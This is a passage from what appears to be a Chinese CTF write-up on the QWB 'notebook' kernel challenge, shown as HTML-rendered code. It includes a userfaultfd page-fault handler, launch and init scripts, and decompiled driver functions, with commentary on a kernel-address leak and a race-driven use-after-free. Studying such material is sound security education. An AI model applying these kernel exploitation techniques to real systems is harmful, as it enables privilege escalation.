read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br>    <span class="hljs-keyword">if</span>(nread == <span class="hljs-number">0</span>)&#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(nread == <span class="hljs-number">-1</span>)<br>      errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>    <span class="hljs-comment">/* We expect only one king of evenr; verify that assuption */</span><br>    <span class="hljs-keyword">if</span>(msg.event != UFFD_EVENT_PAGEFAULT)&#123;<br>      <span class="hljs-built_in">fprintf</span>(strerr, <span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br>      <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>    &#125;<br><br>    <span class="hljs-comment">/* copy things to the addr */</span><br>    <br>    uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>    <span class="hljs-comment">/* We need to handle page faults in units of pages(!).</span><br><span class="hljs-comment">     * So, round faulting address down to page boundary */</span><br>    uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)msg.arg.pagefault.address &amp; ~(page_size - <span class="hljs-number">1</span>);<br><br>    uffdio_copy.len = page_size;<br>    uffdio_copy.mode = <span class="hljs-number">0</span>;<br>    uffdio_copy.copy = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span>(ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>      errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br>  &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h3 id="2-题目逆向"><a href="#2-题目逆向" class="headerlink" title="2. 题目逆向"></a>2. 题目逆向</h3><p>首先，启动脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">qemu-system-x86_64 -m 64M \<br>        -kernel bzImage \<br>        -initrd rootfs.cpio \<br>        -append <span class="hljs-string">&quot;loglevel=0 console=ttyS0 oops=panic panic=1 kaslr&quot;</span> \<br>        -nographic \<br>        -net user -net nic -device e1000 -smp cores=2,threads=2 -cpu kvm64,+smep,+smap \<br>        -monitor /dev/null 2&gt;/dev/null -s \<br>        -no-reboot<br><br></code></pre></td></tr></table></figure><ol><li>双核双线程</li><li>开启kaslr</li><li>smep&#x2F;smap开启</li><li>kpti开启</li></ol><p>:disappointed: 很特么绝望，跟uesrland第一次看到保护全开一片绿的感觉，然后我们查看文件系统的init脚本，如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>/bin/mount -t devtmpfs devtmpfs /dev<br><span class="hljs-built_in">chown</span> root:<span class="hljs-built_in">tty</span> /dev/console<br><span class="hljs-built_in">chown</span> root:<span class="hljs-built_in">tty</span> /dev/ptmx<br><span class="hljs-built_in">chown</span> root:<span class="hljs-built_in">tty</span> /dev/tty<br><span class="hljs-built_in">mkdir</span> -p /dev/pts<br>mount -vt devpts -o gid=4,mode=620 none /dev/pts<br><br>mount -t proc proc /proc<br>mount -t sysfs sysfs /sys<br><br><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict<br><span class="hljs-built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict<br><br>ifup eth0 &gt; /dev/null 2&gt;/dev/null<br><br><span class="hljs-built_in">chown</span> root:root /flag<br><span class="hljs-built_in">chmod</span> 600 /flag<br><br>insmod notebook.ko<br><span class="hljs-built_in">cat</span> /proc/modules | grep notebook &gt; /tmp/moduleaddr<br><span class="hljs-built_in">chmod</span> 777 /tmp/moduleaddr<br><span class="hljs-built_in">chmod</span> 777 /dev/notebook<br><span class="hljs-comment">#poweroff -d 300 -f &amp;</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Welcome to QWB!&quot;</span><br><br><span class="hljs-comment">#sh</span><br>setsid cttyhack setuidgid 1000 sh<br><br>umount /proc<br>umount /sys<br><br>poweroff -d 1 -n -f<br><br></code></pre></td></tr></table></figure><p>发现插入了一个notebook.ko模块，然后我们运行该内核看看基本情况</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">/ $ uname -a<br>Linux (none) 4.15.8 #3 SMP Thu Jun 3 01:01:56 PDT 2021 x86_64 GNU/Linux<br>/ $ lsmod<br>Module                  Size  Used by    Tainted: G  <br>notebook               16384  0 <br>/ $ dmesg<br>dmesg: klogctl: Operation not permitted<br></code></pre></td></tr></table></figure><p>可以看到令我们欣慰的一点是内核版本还不算很高 :happy:,然后我们打开ida反编译一下notebook.ko看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.rodata:0000000000000800                               ; ===========================================================================<br>.rodata:0000000000000800<br>.rodata:0000000000000800                               ; Segment type: Pure data<br>.rodata:0000000000000800                               ; Segment permissions: Read<br>.rodata:0000000000000800                               _rodata segment align_32 public &#x27;CONST&#x27; use64<br>.rodata:0000000000000800                               assume cs:_rodata<br>.rodata:0000000000000800                               ;org 800h<br>.rodata:0000000000000800                               ; const file_operations mynote_fops<br>.rodata:0000000000000800 C0 09 00 00 00 00 00 00 00 00+mynote_fops file_operations &lt;offset __this_module, 0, 0, offset mynote_write, 0, 0, 0, 0, 0, \<br>.rodata:0000000000000800 00 00 00 00 00 00 00 00 00 00+                                        ; DATA XREF: .data:mynote_dev↓o<br>.rodata:0000000000000800 00 00 00 00 80 00 00 00 00 00+                 offset mynote_ioctl, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0&gt;<br>.rodata:0000000000000800 00 00 00 00 00 00 00 00 00 00+_rodata ends<br>.rodata:0000000000000800 00 00 00 00 00 00 00 00 00 00+<br>__mcount_loc:00000000000008F8                               ; ===========================================================================<br>__mcount_loc:00000000000008F8<br>__mcount_loc:00000000000008F8                               ; Segment type: Pure data<br>__mcount_loc:00000000000008F8                               ; Segment permissions: Read<br>__mcount_loc:00000000000008F8                               __mcount_loc segment qword public &#x27;CONST&#x27; use64<br>__mcount_loc:00000000000008F8                               assume cs:__mcount_loc<br>__mcount_loc:00000000000008F8                               ;org 8F8h<br>__mcount_loc:00000000000008F8 00 00 00 00 00 00 00 00       dq offset mynote_read<br>__mcount_loc:0000000000000900 80 00 00 00 00 00 00 00       dq offset mynote_write<br>__mcount_loc:0000000000000908 10 01 00 00 00 00 00 00       dq offset noteadd<br>__mcount_loc:0000000000000910 00 02 00 00 00 00 00 00       dq offset notedel<br>__mcount_loc:0000000000000918 80 02 00 00 00 00 00 00       dq offset noteedit<br>__mcount_loc:0000000000000920 90 03 00 00 00 00 00 00       dq offset notegift<br>__mcount_loc:0000000000000928 E0 03 00 00 00 00 00 00       dq offset mynote_ioctl<br>__mcount_loc:0000000000000930 74 04 00 00 00 00 00 00       dq offset mynote_init<br>__mcount_loc:0000000000000930                               __mcount_loc ends<br></code></pre></td></tr></table></figure><p>一个一个看吧 :bomb:</p><h4 id="mynote-init"><a href="#mynote-init" class="headerlink" title="mynote_init"></a>mynote_init</h4><p>本身为加载一个misc设备的初始化函数，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">mynote_init</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v0; <span class="hljs-comment">// ebx</span><br><br>  _fentry__();<br>  v0 = misc_register(&amp;mynote_dev); <span class="hljs-comment">//内核维护一个misc_list链表，misc设备在misc_register注册的时候链接到这个链表</span><br>  _rwlock_init(&amp;lock, <span class="hljs-string">&quot;&amp;lock&quot;</span>, &amp;krealloc); <span class="hljs-comment">//初始化一个读写锁</span><br>  printk(<span class="hljs-string">&quot;Welcome to BrokenNotebook!\n&quot;</span>);<br>  <span class="hljs-keyword">return</span> v0;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里涉及到一个Linux中读写锁rwlock的概念</p><p>rwlock 主要有以下几种特征：</p><ul><li>多进程对临界区的读不互斥，可同步进行，互不影响</li><li>如果要执行写，需要等所有的读者退出才能执行写操作</li><li>如果正在执行写操作且未完成，这一阶段发生的读操作会被阻塞，即读写互斥</li><li>如果正在执行写操作且未完成，这一阶段发生的读操作会被阻塞，即写写互斥</li><li>不造成睡眠，等待形式是自旋</li></ul><p>这种场景有点像行人过马路，公交车司机必须停在斑马线前等待所有行人过完马路才能继续往前开，在繁忙的时段，不断地有行人走过，就会导致公交车一直止步不前，甚至造成堵车。</p><p>这也是 rwlock 的一大缺点：写者优先级太低，在极端情况下甚至出现饿死的情况，也即是说该锁是一个读优先锁</p><h4 id="mynote-exit"><a href="#mynote-exit" class="headerlink" title="mynote_exit"></a>mynote_exit</h4><p>撤销该驱动时的退出函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __cdecl <span class="hljs-title function_">mynote_exit</span><span class="hljs-params">()</span><br>&#123;<br>  note *v0; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">void</span> *note; <span class="hljs-comment">// rdi</span><br><br>  v0 = notebook;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    note = v0-&gt;note;<br>    ++v0;<br>    kfree(note);<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v0 != &amp;notebook[<span class="hljs-number">16</span>] );<br>  misc_deregister(&amp;mynote_dev);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="mynote-ioctl"><a href="#mynote-ioctl" class="headerlink" title="mynote_ioctl"></a>mynote_ioctl</h4><p>覆盖了ioctl函数，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">mynote_ioctl</span><span class="hljs-params">(file *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> __int64 arg)</span><br>&#123;<br>  __int64 v3; <span class="hljs-comment">// rdx</span><br>  userarg notearg; <span class="hljs-comment">// [rsp+0h] [rbp-28h] BYREF</span><br><br>  _fentry__(file, cmd, arg);<br>  copy_from_user(&amp;notearg, v3, <span class="hljs-number">24LL</span>);<br>  <span class="hljs-keyword">if</span> ( cmd == <span class="hljs-number">0x100</span> )<br>    <span class="hljs-keyword">return</span> noteadd(notearg.idx, notearg.size, notearg.buf);<br>  <span class="hljs-keyword">if</span> ( cmd &lt;= <span class="hljs-number">0x100</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( cmd == <span class="hljs-number">0x64</span> )<br>      <span class="hljs-keyword">return</span> notegift(notearg.buf);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-keyword">if</span> ( cmd == <span class="hljs-number">0x200</span> )<br>      <span class="hljs-keyword">return</span> notedel(notearg.idx);<br>    <span class="hljs-keyword">if</span> ( cmd == <span class="hljs-number">0x300</span> )<br>      <span class="hljs-keyword">return</span> noteedit(notearg.idx, notearg.size, notearg.buf);<br>  &#125;<br>  printk(<span class="hljs-string">&quot;[x] Unknown ioctl cmd!\n&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">-100LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们得以知道在调用ioctl函数时，首先需要传递一个大小为24字节的数据结构，然后将其复制到上面的<code>notearg</code>当中，然后存在下面几个选项</p><table><thead><tr><th align="center">notearg(0x18)</th></tr></thead><tbody><tr><td align="center">idx(0x8)</td></tr><tr><td align="center">size(0x8)</td></tr><tr><td align="center">buf(0x8)</td></tr></tbody></table><ol><li>0x100:以<code>notearg</code>为参数，调用<code>noteadd</code>,也就是添加notebook；</li><li>0x64:调用<code>notegift</code>， 泄露notebook数组内容,  该notebook就是note数据结构作为元素的数组，里面包含了一系列内核地址，也就是说kaslr不值一提😊</li><li>0x200:调用<code>notedel</code>， 根据idx来删除对应内核堆块，<del>以及notebook相应的idx中的size来确定是否置空指针来置空指针</del>，这里是因为其size在del的时候不可为0，即使使用noteedit</li><li>0x300:以<code>notearg</code>为参数，调用<code>noteedit</code>，用来修改notebook单元中的size（不可为0）和note字段</li></ol><p>这里我们还有一个notebook的数据结构</p><table><thead><tr><th align="center">note</th></tr></thead><tbody><tr><td align="center">note</td></tr><tr><td align="center">size</td></tr></tbody></table><h4 id="noteadd-read-lock"><a href="#noteadd-read-lock" class="headerlink" title="noteadd(read_lock)"></a>noteadd(read_lock)</h4><p>使用我们传入的userarg结构体,其中要求idx不能大于0xF,以及size不能大于0x60，还有就是本身的note指针不能有值，不然都会直接返回</p><p>若上述条件均满足，我们就可以将我们userarg中的buf参数值传递给内核bss段上的name了，注意这里并不是note的值，此时内核就会使用kmalloc(size, _<em>GFP</em>*)来申请一个object给我们notebook对应下标的note值，这里使用了读锁，但并没太大关系</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">noteadd</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> size, <span class="hljs-type">void</span> *buf)</span><br>&#123;<br>  __int64 content_0; <span class="hljs-comment">// rdx</span><br>  __int64 content_1; <span class="hljs-comment">// r13</span><br>  note *note_addr; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">size_t</span> orig_size; <span class="hljs-comment">// r14</span><br>  __int64 ret_value; <span class="hljs-comment">// rbx</span><br><br>  (_fentry__)(idx, size, buf);<br>  <span class="hljs-keyword">if</span> ( idx &gt; <span class="hljs-number">0xF</span> ) <span class="hljs-comment">//idx最大0xF</span><br>  &#123;<br>    ret_value = <span class="hljs-number">-1LL</span>;<br>    printk(<span class="hljs-string">&quot;[x] Add idx out of range.\n&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    content_1 = content_0;<br>    note_addr = &amp;notebook[idx]; <span class="hljs-comment">//notebook为bss段上的值，这里是取相应idx对应的地址</span><br>    raw_read_lock(&amp;lock);<br>    orig_size = note_addr-&gt;size; <span class="hljs-comment">//取本来地址块的size位，用来进行可能的还原</span><br>    note_addr-&gt;size = size; <span class="hljs-comment">//填入我们传入的size</span><br>    <span class="hljs-keyword">if</span> ( size &gt; <span class="hljs-number">0x60</span> ) <span class="hljs-comment">//如果说size大于0x60，则进行还原size</span><br>    &#123;<br>      note_addr-&gt;size = orig_size;<br>      ret_value = <span class="hljs-number">-2LL</span>;<br>      printk(<span class="hljs-string">&quot;[x] Add size out of range.\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <br>    &#123;<br>      copy_from_user(name, content_1, <span class="hljs-number">256LL</span>); <span class="hljs-comment">//该name也是一个bss上的值，此时将我们的传递的notearg.buf传递给他</span><br>      <span class="hljs-keyword">if</span> ( note_addr-&gt;note ) <span class="hljs-comment">//若本身存在note，依然还原size</span><br>      &#123;<br>        note_addr-&gt;size = orig_size;<br>        ret_value = <span class="hljs-number">-3LL</span>;<br>        printk(<span class="hljs-string">&quot;[x] Add idx is not empty.\n&quot;</span>);<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        note_addr-&gt;note = _kmalloc(size, <span class="hljs-number">0x24000C0</span>LL); <span class="hljs-comment">//内核分配块</span><br>        printk(<span class="hljs-string">&quot;[+] Add success. %s left a note.\n&quot;</span>, name);<br>        ret_value = <span class="hljs-number">0LL</span>;<br>      &#125;<br>    &#125;<br>    raw_read_unlock(&amp;lock);<br>  &#125;<br>  <span class="hljs-keyword">return</span> ret_value;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="notegift"><a href="#notegift" class="headerlink" title="notegift"></a>notegift</h4><p>该法会将notebook的内容传递给我们的userarg.buf，出题人很温柔:hibiscus:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">notegift</span><span class="hljs-params">(<span class="hljs-type">void</span> *buf)</span><br>&#123;<br>  _fentry__(buf);<br>  printk(<span class="hljs-string">&quot;[*] The notebook needs to be written from beginning to end.\n&quot;</span>);<br>  copy_to_user(buf, notebook, <span class="hljs-number">256LL</span>); <span class="hljs-comment">//传递内核地址给用户奥，太棒了</span><br>  printk(<span class="hljs-string">&quot;[*] For this special year, I give you a gift!\n&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">100LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="notedel-write-lock"><a href="#notedel-write-lock" class="headerlink" title="notedel(write_lock)"></a>notedel(write_lock)</h4><p>通过给定的idx来删除堆块，这里我们看到，首先是一个加了一个写锁，很难绷，然后获取相应idx的note后，调用kfree，挂在kmem_cache上？然后根据size来判断是否将对应位清0，但是按照正常单线程的话这个值不会为0的，即使调用noteedit也不会出现这种情况</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">notedel</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx)</span><br>&#123;<br>  note *v1; <span class="hljs-comment">// rbx</span><br><br>  _fentry__(idx);<br>  <span class="hljs-keyword">if</span> ( idx &gt; <span class="hljs-number">0x10</span> )<br>  &#123;<br>    printk(<span class="hljs-string">&quot;[x] Delete idx out of range.\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    raw_write_lock(&amp;lock);<br>    v1 = &amp;notebook[idx];<br>    kfree(v1-&gt;note);<br>    <span class="hljs-keyword">if</span> ( v1-&gt;size ) <span class="hljs-comment">//v1-&gt;size不为0才会清空</span><br>    &#123;<br>      v1-&gt;size = <span class="hljs-number">0LL</span>;<br>      v1-&gt;note = <span class="hljs-number">0LL</span>; <br>    &#125;<br>    raw_write_unlock(&amp;lock);<br>    printk(<span class="hljs-string">&quot;[-] Delete success.\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="mynote-read"><a href="#mynote-read" class="headerlink" title="mynote_read"></a>mynote_read</h4><p>读notebook的内容奥，这时我们将读取我们rdx参数指向的对应note至我们的buf那儿</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> __fastcall <span class="hljs-title function_">mynote_read</span><span class="hljs-params">(file *file, <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> idx, <span class="hljs-type">loff_t</span> *pos)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// rdx</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// rdx</span><br>  <span class="hljs-type">size_t</span> size; <span class="hljs-comment">// r13</span><br>  <span class="hljs-type">void</span> *note; <span class="hljs-comment">// rbx</span><br><br>  _fentry__(file, buf, idx);<br>  <span class="hljs-keyword">if</span> ( v4 &gt; <span class="hljs-number">0x10</span> )<br>  &#123;<br>    printk(<span class="hljs-string">&quot;[x] Read idx out of range.\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    v5 = v4;<br>    size = notebook[v5].size;<br>    note = notebook[v5].note;<br>    _check_object_size(note, size, <span class="hljs-number">1LL</span>);<br>    copy_to_user(buf, note, size);<br>    printk(<span class="hljs-string">&quot;[*] Read success.\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="mynote-write"><a href="#mynote-write" class="headerlink" title="mynote_write"></a>mynote_write</h4><p>可以看到，这里我们才是真正的写入了note结构体中的note字段，即使在addnote的时候我们也并没有在其中赋值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> __fastcall <span class="hljs-title function_">mynote_write</span><span class="hljs-params">(file *file, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *buf, <span class="hljs-type">size_t</span> idx, <span class="hljs-type">loff_t</span> *pos)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 v4; <span class="hljs-comment">// rdx</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// rdx</span><br>  <span class="hljs-type">size_t</span> size; <span class="hljs-comment">// r13</span><br>  <span class="hljs-type">void</span> *note; <span class="hljs-comment">// rbx</span><br><br>  _fentry__(file);<br>  <span class="hljs-keyword">if</span> ( v4 &gt; <span class="hljs-number">0x10</span> )<br>  &#123;<br>    printk(<span class="hljs-string">&quot;[x] Write idx out of range.\n&quot;</span>, buf);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1LL</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    v5 = v4;<br>    size = notebook[v5].size;<br>    note = notebook[v5].note;<br>    _check_object_size(note, size, <span class="hljs-number">0LL</span>);<br>    <span class="hljs-keyword">if</span> ( copy_from_user(note, buf, size) )<br>      printk(<span class="hljs-string">&quot;[x] copy from user error.\n&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>      printk(<span class="hljs-string">&quot;[*] Write success.\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="noteedit-read-lock"><a href="#noteedit-read-lock" class="headerlink" title="noteedit(read_lock)"></a>noteedit(read_lock)</h4><p>有读锁，我们的新name是我们的userarg.buf,然后我们会调用krealloc来重新分配堆块，这里会判断size是否为0，所以我们也无法通过传递size为0来使用UAF</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">noteedit</span><span class="hljs-params">(<span class="hljs-type">size_t</span> idx, <span class="hljs-type">size_t</span> newsize, <span class="hljs-type">void</span> *buf)</span><br>&#123;<br>  __int64 v3; <span class="hljs-comment">// rdx</span><br>  __int64 v4; <span class="hljs-comment">// r13</span><br>  note *v5; <span class="hljs-comment">// rbx</span><br>  <span class="hljs-type">size_t</span> size; <span class="hljs-comment">// rax</span><br>  __int64 v7; <span class="hljs-comment">// r12</span><br>  __int64 v8; <span class="hljs-comment">// rbx</span><br><br>  _fentry__(idx);<br>  <span class="hljs-keyword">if</span> ( idx &gt; <span class="hljs-number">0xF</span> )<br>  &#123;<br>    v8 = <span class="hljs-number">-1LL</span>;<br>    printk(<span 